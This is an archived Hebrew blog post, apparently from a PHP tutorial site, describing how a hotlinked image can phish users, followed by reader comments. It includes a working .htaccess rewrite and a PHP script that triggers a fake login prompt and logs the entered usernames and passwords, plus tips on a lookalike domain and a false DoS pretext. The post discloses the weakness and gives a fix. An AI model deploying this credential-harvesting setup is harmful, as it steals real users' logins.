@@ -1,0 +1,255 @@
+﻿<!DOCTYPE html>
+<html lang="he" itemscope="" itemtype="http://schema.org/Article" ng-app="phpg">
+<head>
+<base href="http://phpguide.co.il/">
+<meta charset="utf-8">
+<meta name="description" content=" בפוסט הזה אני הולך להסביר למה אסור להשתמש בתמונות ממקורות זרים. ">
+<meta name="keywords" content="פנטסט אבטחת מידע חור">
+<meta name="author" content="Cayce">
+<link rel="shortcut icon" href="static\images\favicon.ico">
+<!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<link rel="stylesheet" type="text/css" href="static\styles\A.allstyles.compiled.css.pagespeed.cf.P4R8BwzxFu.css">
+<title>איך פרצתי ל phpguide</title>
+<meta itemprop="name" content="איך פרצתי ל phpguide">
+<meta itemprop="description" content=" בפוסט הזה אני הולך להסביר למה אסור להשתמש בתמונות ממקורות זרים. ">
+</head>
+<body dir='rtl' class="article"><script type="text/javascript">window.phpgstate={"post":{"id":"287","rating":"31","hasCurrentUserVoted":false}};</script>
+<div class='page-container'>
+<section id='header'>
+<div class="topRowHolder">
+<a class="logo" href="index.htm"><img src="static\images\xlogo.jpg.pagespeed.ic.6YgiLES4FJ.jpg"></a>
+<nav class="main">
+<ul>
+<li><a href="index.htm" class="active">פוסטים</a></li>
+<li><a href="qna.htm">פורום</a></li>
+</ul>
+<div class="clear"></div>
+</nav> <div class="clear"></div>
+</div>
+</section>  
+<div class="layout-holder">
+<section id="content">
+<h1 class='content-title'><span></span>איך פרצתי ל phpguide</h1>
+ 
+<div id="content-publishing-info">
+<div class="right">Cayce, </div>
+<div class="right">&nbsp;<time datetime="2013-01-23T10:49:04+02:00" dir="rtl">23 לינואר 2013</time></div>
+<div class="clear"></div>
+</div>
+ 
+<article>
+<header>
+<div class="right post-image">
+<img src="static\images\xpixel.gif.pagespeed.ic.rbts0odkqk.png" title="http://boomboom.co.il/images/hacked.jpg" alt="איך פרצתי ל phpguide">
+</div>
+<div class="right post-content">
+בפוסט הזה אני הולך להסביר למה אסור להשתמש בתמונות ממקורות זרים. <br>
+</div>
+<div class="clear"></div>
+</header>
+<br><br>
+אני יסביר עם דוגמה.<br>בואו נגיד יש לכם אתר בשם phpguide, בו כל משתמש יכול להוסיף פוסט לאתר עם תמונות ממקור שלו.<br><br>נכתוב כתבה, ונשים בתמונה את הקישור הזה: http://example.com/image.jpg<br>באתר שלנו בעזרת htaccess נעביר שאילתות מ-image.jpg ל-script.php בצורה הזאת:<br><div class="php codeblock">RewriteBase <span class="sy0">/</span><br>
+RewriteEngine on<br>
+RewriteRule image<span class="sy0">.</span>jpg script<span class="sy0">.</span>php</div><br><br>כאשר ה-script.php נראה כך:<br><div class="php codeblock"><span class="kw2">&lt;?php</span><br>
+<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">!</span><span class="kw3">isset</span><span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'PHP_AUTH_USER'</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><br>
+<span class="br0">&#123;</span><br>
+&nbsp;<span class="re0">$vulnsite</span> <span class="sy0">=</span> <span class="kw3">parse_url</span><span class="br0">&#40;</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'REFERER'</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp;<span class="co1">//header('Content-Type: text/html; charset=utf-8');</span><br>
+<span class="co1">//header('WWW-Authenticate: Basic realm=&quot;'.ucfirst($vulnsite['host']).'Enter your Login and Password&quot;');</span><br>
+<span class="co1">//header('HTTP/1.0 401 Unauthorized');</span><br>
+<span class="br0">&#125;</span><br>
+<span class="kw1">else</span><br>
+<span class="br0">&#123;</span><br>
+<span class="re0">$f</span> <span class="sy0">=</span> <span class="kw3">fopen</span><span class="br0">&#40;</span><span class="st_h">'passes.txt'</span><span class="sy0">,</span> <span class="st_h">'a'</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<span class="kw3">fwrite</span><span class="br0">&#40;</span><span class="re0">$f</span><span class="sy0">,</span> <span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'PHP_AUTH_USER'</span><span class="br0">&#93;</span><span class="sy0">.</span><span class="st_h">';'</span><span class="sy0">.</span><span class="re0">$_SERVER</span><span class="br0">&#91;</span><span class="st_h">'PHP_AUTH_PW'</span><span class="br0">&#93;</span><span class="sy0">.</span><span class="st0">&quot;<span class="es1">\r</span><span class="es1">\n</span>&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<span class="kw3">fclose</span><span class="br0">&#40;</span><span class="re0">$f</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<span class="br0">&#125;</span><br>
+<br>
+<span class="kw3">header</span><span class="br0">&#40;</span><span class="st0">&quot;Content-type: image/jpeg&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+&nbsp;<span class="re0">$image</span> <span class="sy0">=</span> <span class="kw3">imagecreatefromjpeg</span><span class="br0">&#40;</span><span class="st_h">'image.jpg'</span><span class="br0">&#41;</span><span class="sy0">;</span><br>
+<span class="kw3">imagejpeg</span><span class="br0">&#40;</span><span class="re0">$image</span><span class="br0">&#41;</span><span class="sy0">;</span> <span class="kw3">imagedestroy</span><span class="br0">&#40;</span><span class="re0">$image</span><span class="br0">&#41;</span><span class="sy0">;</span></div><br>בשלב הזה לא יקרה שום דבר חשוד. אלכס יבדוק את התמונה, ויראה תמונת jpg רגילה, ויאשר את הפוסט<br>והתמונה תגיעה לדף הראשי של האתר.<br>איך שזה קורה, אנחנו מורידים את סימני ההערות מהשורות, ומעכשיו כל מי שנכנס לדף הבית, רואה שהאתר מבקש סיסמה לאתר, ועם סיכוי גבוה הוא ירשום את השם משתמש וסיסמה שיש לו באתר, במחשבה שמי שמבקש את הסיסמה זה phpguide. כדי ליצור יותר אמינות, אפשר לרשום שעכשיו האתר נמצא תחת מתקפת דוס, וכל המשתמשים צריכים להזדהות מחדש, בשילוב עם דומיין: phpgude.co.il<br>זה יראה מספיק אמין עבור גם משתמש מנוסה, ויכול להביא לפריצה של הרבה משתמשים באתר.<br><br>טוב, אני לא באמת ניסיתי לפרוץ למשתמשים באתר, אז החבאתי את זה תחת הקישור: <a href="index-2.htm?hack">http://phpguide.co.il/?hack</a><br><img src="static\images\xpixel.gif.pagespeed.ic.rbts0odkqk.png" alt="איך פרצתי ל phpguide" title="http://chudinov.org/images/6.png" class="content-image-float"><br>אם אלכס לא ימחק, אז אתם גם תראו :)<br>אצלי זה עובד ב FireFox, אבל לא עובד בChromium. שמעתי שזה עובד גם ב IE, ולא עובד ב Chrome.<br><br><strong>פתרון?</strong><br>להעתיק את כל התמונות לשרת שלכם. </article>
+<br><br>
+<div class="info_box" data-ng-controller="PostViewCtrl">
+<div class="right left-spaced">
+<img src="static\images\xpixel.gif.pagespeed.ic.rbts0odkqk.png" title="http://www.gravatar.com/avatar/eae8f99c4b8a7edfc90c2e915ff5c6ec?s=16&r=g&d=monsterid" alt="Cayce">
+<a>Cayce</a>
+</div>
+<div class="clear"></div>
+</div>
+<div>
+</div>
+<section class="comments" id='post_comments'>
+<h2>תגובות לכתבה:</h2>
+<a id="comment2154"></a>
+<div class="blog-comment">
+<span class='comment-author'>intval</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>23/01/2013 02:42</span><br>
+בעיקרון אתה צודק, למרות שהדוגמה הזאת לא עבדה אצלי ב<br>
+ubuntu 12.04 LTS<br>
+chromium 23 &amp; firefox 18.0</div>
+<a id="comment2155"></a>
+<div class="blog-comment">
+<span class='comment-author'>intval</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>23/01/2013 02:45</span><br>
+במחשבה שניה זה באמת עובד בפיירפוקס.<br>
+נשאיר את זה בינתיים ככה</div>
+<a id="comment2157"></a>
+<div class="blog-comment">
+<span class='comment-author'>amitdar</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>23/01/2013 03:49</span><br>
+Like!<br>
+לפעמים שוכחים שעם כל ההגנות שאנחנו עושים על הקוד בסוף דברים כאלה הם שמפילים אותנו...<br>
+<br>
+חשוב לזכור לבדוק כל קלט מהמשתמש, ולנקות אותו מתגיות ודברים שיכולים לפעול. בנוסף תמונות מומלץ להעלות לשרת שלכם.<br>
+<br>
+נ.ב.<br>
+יכולת לעשות את זה גם פשוט יותר, פשוט הלינק לתמונה היה קובץ php שמחזיר את התמונה, עד אשר היית משנה אותו. אני בספק אם אלכס ממש הסתכל על הלינק לתמונה ולא פשוט על התמונה עצמה.</div>
+<a id="comment2161"></a>
+<div class="blog-comment">
+<span class='comment-author'>CaTz</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>23/01/2013 12:33</span><br>
+רעיון נחמד, רק דבר אחד היה מדליק אצלי נורה,<br>
+FF, לפחות הגירסה האחרונה, אצלי 18, כותבת מאיזה דומיין הבקשה הזו, וזה במיוחד למקרים כאלו.<br>
+</div>
+<a id="comment2162"></a>
+<div class="blog-comment">
+<span class='comment-author'>liorel100</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>23/01/2013 14:10</span><br>
+אז מה עושים נניח במקרה של פורום?<br>
+</div>
+<a id="comment2170"></a>
+<div class="blog-comment">
+<span class='comment-author'>Cayce</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>25/01/2013 01:28</span><br>
+CaTz, בגלל זה רשמתי להשתמש בדומיין phpgude.co.il.<br>
+<br>
+liorel100, אותו דבר חח, למה שיהיה משהו שונה?</div>
+<a id="comment2173"></a>
+<div class="blog-comment">
+<span class='comment-author'>liorel100</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>25/01/2013 08:11</span><br>
+התכוונתי איך מגנים במקרה של פורום....<br>
+</div>
+<a id="comment2174"></a>
+<div class="blog-comment">
+<span class='comment-author'>Cayce</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>25/01/2013 12:21</span><br>
+אה חח, אין לי מושג. אבל האמת גם - אותו דבר.<br>
+<br>
+יש לך פורום? באיזה סקריפט אתה משתמש?</div>
+<a id="comment2175"></a>
+<div class="blog-comment">
+<span class='comment-author'>ldbrgr</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>25/01/2013 14:52</span><br>
+זה חור בדפדפן, לא ב phpguide.</div>
+<a id="comment2176"></a>
+<div class="blog-comment">
+<span class='comment-author'>Cayce</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>26/01/2013 04:15</span><br>
+ldbrgr, לא נכון.<br>
+<br>
+זה גם לא חור בדפדפן, זה טריק שמורשה על ידי פרוטוקול http.<br>
+כל קובץ יכול לבקש התחברות, גם אם הקובץ בא ממקור אחר. פשוט צריך לקחת את זה בחשבון.</div>
+<a id="comment2177"></a>
+<div class="blog-comment">
+<span class='comment-author'>ldbrgr</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>26/01/2013 11:35</span><br>
+אם היית מדבר על iframes הייתי מבין, אבל אין שום סיבה בעולם שהדפדפן יבקש ממך להזדהות כדי להציג *תמונה* מצד שלישי. ולא רק אני חושב ככה, גם החבר&apos;ה בכרום הבינו שזה חור.<br>
+<br>
+ובכנות מה הקשר &quot;טריק שמורשה על ידי פרוטוקול http&quot;?? מה הטריק פה? למה החלטת שהוא מורשה ע&quot;י פרוטוקול?? עזוב, אתה יודע מה זה פרוטוקול?..</div>
+<a id="comment2179"></a>
+<div class="blog-comment">
+<span class='comment-author'>Cayce</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>26/01/2013 12:29</span><br>
+הכל טוב, לא צריך להתרגש :)<br>
+<br>
+נכנסים לאתר w3.org, שמגדיר תקינה ברשת, וקוראים:<br>
+<span dir="ltr"><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec11.html#sec11">http://www.w3.org/Protocols/rfc2616/rfc2616-sec11.html#sec11</a></span><br>
+זה נכון לכל סוג של קובץ בנפרד. כל אחד מהקבצים שהדפדפן מוריד יכול לבקש התחברות, זה התקן, זה מה שהגדירו.<br>
+אם תגיד שw3.org לא קובע תקן, אז פשוט תסתכל על רוב הדפדפנים - הם תומכים באפשרות הזאת.<br>
+<br>
+אני קבעתי שזה מורשה על ידי הפרוטוקול, כי ככה זה תוכנן מלכתחילה, זה לא פספוס של המתכנתים, זה פספוס בתכנון של הפרוטוקול.</div>
+<a id="comment2180"></a>
+<div class="blog-comment">
+<span class='comment-author'>Cayce</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>26/01/2013 12:39</span><br>
+הדפדפן רק עוקב אחרי החוקים של הפרוטוקול, והפרוטוקול אומר שכל קובץ יכול לבקש התחברות. זה הכל. איך אני יודע שזה מה שהפרוטוקול קובע? - כי ככה מוגדר בw3.org, וזה מה שמקובל עכשיו ברוב הדפדפנים.</div>
+<a id="comment2181"></a>
+<div class="blog-comment">
+<span class='comment-author'>ldbrgr</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>26/01/2013 14:13</span><br>
+פרוטוקול HTTP גם &quot;מרשה&quot; להשתמש בmethod&apos;s שלא נתמכות ע&quot;י כל דפדפן, זה רק מראה את המרחק בין פרוטוקול לדפדפן..<br>
+לא יוצאות לי המילים להסביר לך איך זה חור בדפדפן וכמה החוט מחשבה שלי רחוק משלך.<br>
+בכל מקרה אין שום סיבה בעולם שהדפדפן יבקש דבר כזה..</div>
+<a id="comment2183"></a>
+<div class="blog-comment">
+<span class='comment-author'>liorel100</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>26/01/2013 21:15</span><br>
+התכוונתי איך עושים הגנה במקרה של פורום, שאי אפשר להעלות לעליו את כל התמונות שאנשים שמים שם.</div>
+<a id="comment2192"></a>
+<div class="blog-comment">
+<span class='comment-author'>ilikeme</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>30/01/2013 08:40</span><br>
+וואו, איזה רעיון פריצה מדהים :)<br>
+חחחח זה מחרפן אותי איך האקרים מצליחים לחשוב על דרכי פריצה כאלה :)</div>
+<a id="comment2536"></a>
+<div class="blog-comment">
+<span class='comment-author'>liorel100</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>19/08/2013 16:02</span><br>
+אפשר להגן על הפריצה הזאת ע&quot;י שימוש ברפרנס לתמונה במקום לתמונה עצמה, ואני הסביר :<br>
+במקום לתת לדפדפן לטעון את התמונה בעצמו אנחנו נטען אותה בשבילו. כך גם נוכל לוודא שהיא באמת תמונה ולא שונתה. כמו כן אפשר להשתמש במנגנוני קאש שונים על מנת לייעל את התהליך.</div>
+</section>
+</section>  
+<section id="sidebar">
+<section id="search_box">
+<form method="get" action="http://www.google.co.il/search" id="search_form">
+<input type="hidden" name="hl" value="iw">
+<input type="checkbox" name="sitesearch" style="display:none" value="http://phpguide.co.il" checked="">
+<input type="text" class="search_form" placeholder="חיפוש" name="q" id="search_field">
+<input type="submit" value="" title="לחפש">
+</form>
+</section>
+<style>.staticSidebarPageLinks a{color:#e85a2d;font-weight:bold;text-decoration:underline}</style>
+<div class='rblock staticSidebarPageLinks' style="padding:0 -50px; width:100%; background: white;">
+<a href="page_mvcebook.html" title="למד איך עובד MVC" onclick="Analytics.track('Promotion', 'click', 'GoToLanding', 'mvcebook-sidebar-banner1');">
+ספר חינם על MVC
+</a>
+שאתה הולך להוריד כי אם אתה רוצה ללמוד על ארגון קוד יעיל ומודרני באתרים כמו זה או פייסבוק או כי כולם אוהבים להוריד דברים איכותיים בחינם מהאינטרנט
+<br><br>
+<a href='page_oopbook.html'>
+ספר הלימוד - תכנות מונחה עצמים מאפס
+</a>
+שסוף סוף ילמד אותך פיתוח מונחה עצמים נכון בצורה פשוטה, יענה על כל השאלות ויכין אותך לרעיונות עבודה.
+<br><br>
+<a href='page_phpunit.html'>
+קורס בדיקות יחידה phpunit
+</a>
+שיעזור לך להקטין בחצי את כמות הבאגים, את כאב הראש והזמן המבוזבז על פתירתם
+<br><br>
+<a href='page_mysqlinteractive.html'>
+קורס mysql אינטרקטיבי
+</a>
+שיייקח אותך צעד אחר צעד למומחה שאילתות mysql לייב
+<br><br><br>
+<small>האתר ב-readonly
+<br>
+תודה לכל מי שתרם, ענה, שאל, כתב, לימד ועזר במשך השנים <br>
+orelbey, splash, raslin, cayce, iiddaannyy, michael, kingyes, ilikeme, itamarhadad, iosolidar, jbstyle<br>
+- alex@הדומיין הזה
+</small>
+</div>
+</section>
+</div>
+<footer id='footer'>
+</footer>
+</div>  
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular.min.js"></script>
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular-resource.min.js"></script>
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular-cookies.min.js"></script>
+<script type="text/javascript" src="assets\c2224fc8\jquery.min.js.pagespeed.jm.0IhQ85x_cu.js"></script>
+<script src="static\scripts\scripts.compiled.js plugins.js ui.js analytics.js.pagespeed.jc.HoDAx8MSoV.js"></script><script>eval(mod_pagespeed_suqc1br1Uj);</script>
+<script>eval(mod_pagespeed_tNeKvp6lmR);</script>
+<script>eval(mod_pagespeed_PxPJYmoXjB);</script>
+<script>eval(mod_pagespeed_2G0hMgPcln);</script>
+</body>
+</html>
